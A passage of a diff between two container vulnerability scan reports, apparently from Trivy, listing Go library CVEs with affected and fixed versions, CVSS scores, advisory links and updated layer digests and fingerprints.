+│     │      │                  ├ [27]: https://linux.oracle.com/cve/CVE-2026-25681.html 
+│     │      │                  ├ [28]: https://linux.oracle.com/errata/ELSA-2026-37123.html 
+│     │      │                  ├ [29]: https://nvd.nist.gov/vuln/detail/CVE-2026-25681 
+│     │      │                  ├ [30]: https://pkg.go.dev/vuln/GO-2026-5029 
+│     │      │                  ╰ [31]: https://www.cve.org/CVERecord?id=CVE-2026-25681 
 │     │      ├ PublishedDate   : 2026-05-22T16:16:19.863Z 
 │     │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
 │     ├ [26] ╭ VulnerabilityID : CVE-2026-27136 
@@ -7076,13 +6670,13 @@
 │     │      ├ InstalledVersion: v0.48.0 
 │     │      ├ FixedVersion    : 0.55.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-27136 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:ac8268949b5c39b7ce596e3686748970d5bf2d4d7e2616f64c3208a5fd01cc94 
+│     │      ├ Fingerprint     : sha256:d18a5977405e0c27da9785e9822d770c683a5ecfca5f7e33f83a6fae8a8e1280 
 │     │      ├ Title           : golang.org/x/net/html: golang: golang.org/x/net/html: Cross-Site Scripting via
 │     │      │                    HTML parsing bypass 
 │     │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render can result in an
@@ -7142,14 +6736,14 @@
 │     │      ├ InstalledVersion: v0.48.0 
 │     │      ├ FixedVersion    : 0.53.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : nvd 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33814 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:a120ef938665f8917093c04cb3e6c8d4005255fec20e7e9ae602de3372d3a756 
+│     │      ├ Fingerprint     : sha256:cdf72342eb0d12e9e68f0c296846902c749fe91c5390c93e88daaf2562fbf162 
 │     │      ├ Title           : net/http/internal/http2: golang: golang.org/x/net: Go HTTP/2: Denial of
 │     │      │                   Service via malformed SETTINGS_MAX_FRAME_SIZE frame 
 │     │      ├ Description     : When processing HTTP/2 SETTINGS frames, transport will enter an infinite loop
@@ -7213,13 +6807,13 @@
 │     │      ├ InstalledVersion: v0.48.0 
 │     │      ├ FixedVersion    : 0.55.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39821 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:8351cd52fcf637dce742ee2b5279a91c2ec9caf0d848fd9ead3bd1415dd7a098 
+│     │      ├ Fingerprint     : sha256:c54ed0a3b10c49dc6a3d3767c1393f473a814e04ab068cbe53c2ffc5a7c17394 
 │     │      ├ Title           : golang.org/x/net/idna: golang: net/http: golang.org/x/net/idna: Privilege
 │     │      │                   escalation via incorrect Punycode label processing 
 │     │      ├ Description     : The ToASCII and ToUnicode functions incorrectly accept Punycode-encoded labels
@@ -7330,24 +6924,25 @@
 │     │      │                  ├ [85] : https://access.redhat.com/errata/RHSA-2026:47952 
 │     │      │                  ├ [86] : https://access.redhat.com/security/cve/CVE-2026-39821 
 │     │      │                  ├ [87] : https://bugzilla.redhat.com/2480756 
-│     │      │                  ├ [88] : https://bugzilla.redhat.com/show_bug.cgi?id=2480756 
-│     │      │                  ├ [89] : https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
-│     │      │                  ├ [90] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39821 
-│     │      │                  ├ [91] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39822 
-│     │      │                  ├ [92] : https://errata.almalinux.org/9/ALSA-2026-37435.html 
-│     │      │                  ├ [93] : https://errata.rockylinux.org/RLSA-2026:37435 
-│     │      │                  ├ [94] : https://github.com/golang/go/issues/78760 
-│     │      │                  ├ [95] : https://go.dev/cl/767220 
-│     │      │                  ├ [96] : https://go.dev/issue/78760 
-│     │      │                  ├ [97] : https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
-│     │      │                  ├ [98] : https://linux.oracle.com/cve/CVE-2026-39821.html 
-│     │      │                  ├ [99] : https://linux.oracle.com/errata/ELSA-2026-46395.html 
-│     │      │                  ├ [100]: https://nvd.nist.gov/vuln/detail/CVE-2026-39821 
-│     │      │                  ├ [101]: https://pkg.go.dev/vuln/GO-2026-5026 
-│     │      │                  ├ [102]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-3982
+│     │      │                  ├ [88] : https://bugzilla.redhat.com/2484207 
+│     │      │                  ├ [89] : https://bugzilla.redhat.com/show_bug.cgi?id=2480756 
+│     │      │                  ├ [90] : https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
+│     │      │                  ├ [91] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39821 
+│     │      │                  ├ [92] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39822 
+│     │      │                  ├ [93] : https://errata.almalinux.org/10/ALSA-2026-46395.html 
+│     │      │                  ├ [94] : https://errata.rockylinux.org/RLSA-2026:37435 
+│     │      │                  ├ [95] : https://github.com/golang/go/issues/78760 
+│     │      │                  ├ [96] : https://go.dev/cl/767220 
+│     │      │                  ├ [97] : https://go.dev/issue/78760 
+│     │      │                  ├ [98] : https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
+│     │      │                  ├ [99] : https://linux.oracle.com/cve/CVE-2026-39821.html 
+│     │      │                  ├ [100]: https://linux.oracle.com/errata/ELSA-2026-46395.html 
+│     │      │                  ├ [101]: https://nvd.nist.gov/vuln/detail/CVE-2026-39821 
+│     │      │                  ├ [102]: https://pkg.go.dev/vuln/GO-2026-5026 
+│     │      │                  ├ [103]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-3982
 │     │      │                  │        1.json 
-│     │      │                  ├ [103]: https://ubuntu.com/security/notices/USN-8416-1 
-│     │      │                  ╰ [104]: https://www.cve.org/CVERecord?id=CVE-2026-39821 
+│     │      │                  ├ [104]: https://ubuntu.com/security/notices/USN-8416-1 
+│     │      │                  ╰ [105]: https://www.cve.org/CVERecord?id=CVE-2026-39821 
 │     │      ├ PublishedDate   : 2026-05-22T16:16:20.41Z 
 │     │      ╰ LastModifiedDate: 2026-07-31T13:18:09.37Z 
 │     ├ [29] ╭ VulnerabilityID : CVE-2026-25680 
@@ -7359,13 +6954,13 @@
 │     │      ├ InstalledVersion: v0.48.0 
 │     │      ├ FixedVersion    : 0.55.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-25680 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:628dddac9124a88837d88f71ecf28c974d7b259843d4c8778d717f8363bb425a 
+│     │      ├ Fingerprint     : sha256:067c3100d80a0cb12c8ec1013b4587e9ec4c2485b5bc325626dac721c80c0dd9 
 │     │      ├ Title           : golang.org/x/net/html: golang.org/x/net/html: Denial of Service due to
 │     │      │                   excessive HTML parsing 
 │     │      ├ Description     : Parsing arbitrary HTML can consume excessive CPU time, possibly leading to
@@ -7395,13 +6990,13 @@
 │     │      ├ InstalledVersion: v0.48.0 
 │     │      ├ FixedVersion    : 0.55.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42502 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:45095fda216a24ab2ad35bf3cfd51cc7a803224ed7c8bf2efffcd299c4efb2dd 
+│     │      ├ Fingerprint     : sha256:aff8bee186a1a0edb8f927b7517924e00f3750d89538d5b5dba0b0e2e09343c3 
 │     │      ├ Title           : golang.org/x/net/html: golang: golang.org/x/net/html: Cross-Site Scripting via
 │     │      │                    unexpected HTML tree rendering 
 │     │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render can result in an
@@ -7432,13 +7027,13 @@
 │     │      ├ InstalledVersion: v0.48.0 
 │     │      ├ FixedVersion    : 0.55.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42506 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:6df9d145f3bbeddda65e4d74e79ca006f10a400b44d30d12ccfab175db42bc01 
+│     │      ├ Fingerprint     : sha256:13d001ff9f2f3caeed592bc9e294aa6b201ee278ab3649354497786db52ca4fc 
 │     │      ├ Title           : golang.org/x/net/html: golang.org/x/net/html: Cross-Site Scripting (XSS) via
 │     │      │                   arbitrary HTML parsing 
 │     │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render can result in an
@@ -7469,13 +7064,13 @@
 │     │      ├ InstalledVersion: v0.48.0 
 │     │      ├ FixedVersion    : 0.56.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-46600 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:0f4b1ca84b2419204abd645e17248b9b410bdad8bccb6e99367a314c378e5502 
+│     │      ├ Fingerprint     : sha256:0fff5e1b60d1a6653a72692b5ffdeb8bcff0581bdd03b118043dca8361b1bb93 
 │     │      ├ Title           : Parsing an invalid SVCB or HTTPS RR can panic when the size of a param ... 
 │     │      ├ Description     : Parsing an invalid SVCB or HTTPS RR can panic when the size of a parameter
 │     │      │                   value overflows the message buffer. 
@@ -7495,13 +7090,13 @@
 │     │      ├ InstalledVersion: v0.39.0 
 │     │      ├ FixedVersion    : 0.44.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39824 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:3d0f084b05561b01b7ba85ba13e0bfa9bd43a31ed07f7e07c797f4f56edc8e3b 
+│     │      ├ Fingerprint     : sha256:6435611863d0ad2476ff4ad0f0c0d4c2a90777d7c5ad46a86c81971f8e9a2892 
 │     │      ├ Title           : Invoking integer overflow in NewNTUnicodeString in golang.org/x/sys/windows 
 │     │      ├ Description     : NewNTUnicodeString does not check for string length overflow. When provided
 │     │      │                   with a string that overflows the maximum size of a NTUnicodeString (a 16-bit
@@ -7523,13 +7118,13 @@
 │     │      ├ InstalledVersion: v0.32.0 
 │     │      ├ FixedVersion    : 0.39.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56852 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:021fc87fdfb94e54d7b35d39b901c5f48ccd437bf0479d8f9fe96857de47c5a4 
+│     │      ├ Fingerprint     : sha256:0f871276fb17294382569551eccb95cfbb14dfdc7fc68e2c4f3aba88eef31427 
 │     │      ├ Title           : A norm.Iter can enter an infinite loop when handling input containing  ... 
 │     │      ├ Description     : A norm.Iter can enter an infinite loop when handling input containing invalid
 │     │      │                   UTF-8 bytes. 
@@ -7550,14 +7145,14 @@
 │     │      ├ InstalledVersion: v1.79.3 
 │     │      ├ FixedVersion    : 1.82.1 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://github.com/advisories/GHSA-hrxh-6v49-42gf 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Go 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│     │      ├ Fingerprint     : sha256:d446c42719619a10b33c1537215910dfec549be39c9c121f7905bda21aa142e0 
+│     │      ├ Fingerprint     : sha256:f8b99cf856ba0f6e876c5f39c20db8bd9d5bf22cc26f387da5c1543ed75b380a 
 │     │      ├ Title           : gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities 
 │     │      ├ Description     : Multiple security vulnerabilities have been identified and addressed in
 │     │      │                   grpc-go affecting the xDS RBAC authorization engine (internal/xds/rbac) and
@@ -7656,13 +7251,13 @@
 │     │      ├ InstalledVersion: v1.26.3 
 │     │      ├ FixedVersion    : 1.25.11, 1.26.4 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-27145 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:f11fe8dcc9d2e63961e4c2c369f4ceb9c570d324699f376148d211cb1ef1cf49 
+│     │      ├ Fingerprint     : sha256:28abc763e268f392bc1dba69829b1fac1dd01c7da4d9154813ff16b11057de1e 
 │     │      ├ Title           : crypto/x509: golang: golang crypto/x509: Denial of Service via excessive
 │     │      │                   processing of DNS SAN entries 
 │     │      ├ Description     : (*x509.Certificate).VerifyHostname previously called matchHostnames in a loop
@@ -7723,13 +7318,13 @@
 │     │      │                  ├ [36]: https://access.redhat.com/errata/RHSA-2026:47735 
 │     │      │                  ├ [37]: https://access.redhat.com/errata/RHSA-2026:47737 
 │     │      │                  ├ [38]: https://access.redhat.com/security/cve/CVE-2026-27145 
-│     │      │                  ├ [39]: https://bugzilla.redhat.com/2445356 
+│     │      │                  ├ [39]: https://bugzilla.redhat.com/2480756 
 │     │      │                  ├ [40]: https://bugzilla.redhat.com/2484207 
 │     │      │                  ├ [41]: https://bugzilla.redhat.com/show_bug.cgi?id=2445356 
 │     │      │                  ├ [42]: https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
 │     │      │                  ├ [43]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25679 
 │     │      │                  ├ [44]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27145 
-│     │      │                  ├ [45]: https://errata.almalinux.org/9/ALSA-2026-36317.html 
+│     │      │                  ├ [45]: https://errata.almalinux.org/10/ALSA-2026-46395.html 
 │     │      │                  ├ [46]: https://errata.rockylinux.org/RLSA-2026:36317 
 │     │      │                  ├ [47]: https://go.dev/cl/783621 
 │     │      │                  ├ [48]: https://go.dev/issue/79694 
@@ -7752,13 +7347,13 @@
 │     │      ├ InstalledVersion: v1.26.3 
 │     │      ├ FixedVersion    : 1.25.12, 1.26.5, 1.27.0-rc.2 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39822 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:47a42d38ab3e8ad43b5cf99a2886b7483163515d3999f2caa32ab6f94806725b 
+│     │      ├ Fingerprint     : sha256:981caa47e54a6c11f1a78944ab50fb4f2fe5eab4cb7fa6041a76427f5462c202 
 │     │      ├ Title           : os: golang: Go os.Root: Symlink following vulnerability allows directory
 │     │      │                   traversal 
 │     │      ├ Description     : On Unix systems, opening a file in an os.Root improperly follows symlinks to
@@ -7778,12 +7373,12 @@
 │     │      │                  │         ╰ V3Score : 7.8 
 │     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H 
 │     │      │                            ╰ V3Score : 7.8 
-│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:38878 
+│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:38495 
 │     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-39822 
 │     │      │                  ├ [2] : https://bugzilla.redhat.com/2498152 
 │     │      │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
 │     │      │                  ├ [4] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39822 
-│     │      │                  ├ [5] : https://errata.almalinux.org/9/ALSA-2026-38878.html 
+│     │      │                  ├ [5] : https://errata.almalinux.org/10/ALSA-2026-38495.html 
 │     │      │                  ├ [6] : https://errata.rockylinux.org/RLSA-2026:38878 
 │     │      │                  ├ [7] : https://go.dev/cl/797880 
 │     │      │                  ├ [8] : https://go.dev/issue/79005 
@@ -7804,13 +7399,13 @@
 │     │      ├ InstalledVersion: v1.26.3 
 │     │      ├ FixedVersion    : 1.25.11, 1.26.4 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42504 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:90a850d402113369ddfa25f7abcc39db9dd2ef9755a88525a7073c7229904d3b 
+│     │      ├ Fingerprint     : sha256:462cbf7f9a46d736cb59becf0008786f2343f84fc0e7d33741050dff11b1ae3f 
 │     │      ├ Title           : mime: golang: Golang MIME: Denial of Service via maliciously-crafted MIME header 
 │     │      ├ Description     : Decoding a maliciously-crafted MIME header containing many invalid
 │     │      │                   encoded-words can consume excessive CPU. 
@@ -7842,13 +7437,13 @@
 │     │      ├ InstalledVersion: v1.26.3 
 │     │      ├ FixedVersion    : 1.25.12, 1.26.5, 1.27.0-rc.2 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42505 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:e61131eb0650f74d0a34710f4eaeba206a5666d8c8b91083b912c2573d446a4f 
+│     │      ├ Fingerprint     : sha256:27f7bf98716c7e2245cd85fae61480a015fa29e2c0f53fe9b264aa91f7cd7b1f 
 │     │      ├ Title           : crypto/tls: golang: Go crypto/tls: Information disclosure in Encrypted Client
 │     │      │                   Hello 
 │     │      ├ Description     : Handshakes which used Encrypted Client Hello could be de-anonymized by a
@@ -7881,13 +7476,13 @@
 │            ├ InstalledVersion: v1.26.3 
 │            ├ FixedVersion    : 1.25.11, 1.26.4 
 │            ├ Status          : fixed 
-│            ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│            │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│            ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│            │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │            ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42507 
 │            ├ DataSource       ╭ ID  : govulndb 
 │            │                  ├ Name: The Go Vulnerability Database 
 │            │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│            ├ Fingerprint     : sha256:823cd66ebdc2f94d2972075b7184cf10954035f2bda19d16708beac2af5e7d9d 
+│            ├ Fingerprint     : sha256:efe5753bf995d9fef074a8e4a17ba0b03c390651f7b03a4e14db1d79eb1073af 
 │            ├ Title           : net/textproto: golang: Golang net/textproto: Misleading error messages via
 │            │                   input injection 
 │            ├ Description     : When returning errors, functions in the net/textproto package would include
@@ -7904,14 +7499,14 @@
 │            │                  │         ╰ V3Score : 5.3 
 │            │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N 
 │            │                            ╰ V3Score : 5.3 
-│            ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:29981 
+│            ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:29980 
 │            │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-42507 
 │            │                  ├ [2] : https://bugzilla.redhat.com/2484205 
 │            │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2484205 
 │            │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
 │            │                  ├ [5] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27145 
 │            │                  ├ [6] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42507 
-│            │                  ├ [7] : https://errata.almalinux.org/9/ALSA-2026-29981.html 
+│            │                  ├ [7] : https://errata.almalinux.org/10/ALSA-2026-29980.html 
 │            │                  ├ [8] : https://errata.rockylinux.org/RLSA-2026:29981 
 │            │                  ├ [9] : https://go.dev/cl/777060 
 │            │                  ├ [10]: https://go.dev/issue/79346 
@@ -7930,12 +7525,12 @@
       │     │                  ╰ UID : cb267a106a2d658a 
       │     ├ InstalledVersion: v0.54.0 
       │     ├ Status          : affected 
-      │     ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-      │     │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
